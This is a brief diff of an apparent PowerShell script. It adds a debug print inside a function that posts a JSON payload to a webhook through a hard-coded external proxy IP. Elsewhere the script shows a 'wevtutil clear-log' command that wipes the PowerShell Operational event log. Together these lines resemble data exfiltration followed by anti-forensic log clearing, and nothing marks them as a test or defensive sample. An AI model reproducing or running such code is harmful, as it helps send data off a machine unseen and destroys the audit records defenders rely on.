@@ -35,6 +35,8 @@ function Send-Webhook-Data {
     $proxy = "http://200.174.198.158:8888"
 
     $body = $Payload | ConvertTo-Json -Depth 5
+
+    Write-Host $body -ForegroundColor Yellow
     
     try {
         Invoke-RestMethod `
@@ -568,6 +570,7 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
 
 
